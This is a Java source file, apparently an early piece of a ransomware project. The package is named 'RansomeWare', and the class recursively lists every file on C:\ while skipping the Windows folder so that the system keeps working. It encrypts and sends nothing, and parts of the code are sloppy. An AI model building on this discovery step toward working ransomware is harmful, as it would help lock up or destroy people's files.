/********************************************************************
    _____                        __        __
   |_   _|                      |  |      | |
     | |   ___ _ __   __ ____ _ |  |  __  | |
     | | /   _' |\ \ / //   _' ||  | /  \ | |
   __/ / | (_ ) | \ V / | (_ ) |\  V  /\ V  /
  \__ /  \____,_|  \_/  \____,_| \__/   \__/


 *********************************************************************/
package RansomeWare;

import java.io.File;
import java.text.SimpleDateFormat;

public class FindFiles {
    static int count = 0;

    public void traverse(String path) {
        File root = new File(path);
        File[] list = root.listFiles();

        if(list == null) return;

        for(File f: list) {
            if (f.isDirectory()) {
                if (f.getName().equals("Windows")) return; //want system to still work

                traverse(f.getAbsolutePath());
                System.out.println("Dir:" + f.getAbsoluteFile());
            } else {
                SimpleDateFormat lastModified = new SimpleDateFormat("dd/MM/yyyy");
                System.out.println("File:" + f.getAbsoluteFile() + " Last Modified:" + f.lastModified());
                count++;
            }
        }

    }

    public static void main(String[] args) {
        FindFiles ff = new FindFiles();
        ff.traverse("c:\\");
        System.out.println(count);
    }
}
